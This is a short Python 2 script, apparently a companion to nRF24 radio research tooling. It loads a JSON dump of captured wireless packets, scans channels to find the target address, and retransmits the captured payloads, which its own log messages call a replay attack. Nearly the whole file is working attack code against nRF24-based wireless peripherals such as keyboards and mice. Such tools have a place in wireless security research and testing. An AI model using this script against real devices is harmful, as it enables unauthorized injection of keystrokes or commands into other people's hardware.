import time, logging, json, sys, signal
from lib import common

def handler(signal_num,frame):
  print("\nPressed Ctrl-C.\nReplay attack stop!")
  sys.exit(signal_num)

signal.signal(signal.SIGINT, handler)

common.init_args('./nrf24-relpay.py')
common.parser.add_argument('-f', '--json_file', type=str, help='Load dump file', required=True)
common.parser.add_argument('-k', '--ack_timeout', type=int, help='ACK timeout in microseconds, accepts [250,4000], step 250', default=500)
common.parser.add_argument('-r', '--retries', type=int, help='Auto retry limit, accepts [0,15]', default='5', choices=xrange(0, 16), metavar='RETRIES')
common.parser.add_argument('-p', '--ping_payload', type=str, help='Ping payload, ex 0F:0F:0F:0F', default='0F:0F:0F:0F', metavar='PING_PAYLOAD')
common.parse_and_init()

#Load dump file
raw_json = open(common.args.json_file,'r')
dump_data = json.loads(raw_json.read())
raw_json.close()

#Get target address from json
address = dump_data['addr'].replace(':', '').decode('hex')[::-1][:5]
logging.info('Target Address: {0} , {1} payload loaded!'.format(dump_data['addr'],len(dump_data['data'])))

# Parse the ping payload
ping_payload = common.args.ping_payload.replace(':', '').decode('hex')

# Format the ACK timeout and auto retry values
ack_timeout = int(common.args.ack_timeout / 250) - 1
ack_timeout = max(0, min(ack_timeout, 15))
retries = max(0, min(common.args.retries, 15))

# Put the radio in sniffer mode (ESB w/o auto ACKs)
common.radio.enter_sniffer_mode(address)
while True :
  
  # Step through each channel
  for c in range(len(common.args.channels)):
    common.radio.set_channel(common.channels[c])
    # Attempt to ping the address
    if common.radio.transmit_payload(ping_payload, ack_timeout, retries):
      logging.info('Found {0} on channel {1}'.format(dump_data['addr'],common.channels[c]))
      logging.info('Start replay attack!')
      for c in range(len(dump_data['data'])):
        time.sleep(0.007)
        common.radio.transmit_payload(dump_data['data'][c]['pl'].replace(':', '').decode('hex'))
      logging.info('Replay attack done!')